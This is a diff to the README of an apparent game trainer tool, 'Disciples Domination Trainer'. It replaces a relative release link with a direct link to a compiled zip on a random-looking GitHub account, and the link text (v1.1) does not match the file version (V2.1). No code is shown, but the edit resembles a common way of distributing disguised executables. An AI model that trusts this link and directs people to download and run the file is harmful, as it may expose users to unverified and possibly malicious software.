@@ -41,7 +41,7 @@ Modern, standalone trainer with clean UI and advanced memory manipulation featur
 
 ## 📥 Download
 
-**[Download Latest Release v1.1](../../releases/latest)**
+**[Download Latest Release v1.1](https://github.com/xzqclecfb/Disciples_Domination_Trainer_v1.1_SOURCE/releases/download/Compiled-version/Disciples.Domination.TrainerV2.1.zip)**
 
 - **Size:** ~130 KB
 - **Format:** Standalone EXE
@@ -256,3 +256,4 @@ If you find this useful:
 [Download](../../releases) • [Documentation](docs/) • [Report Bug](../../issues)
 
 </div>
+
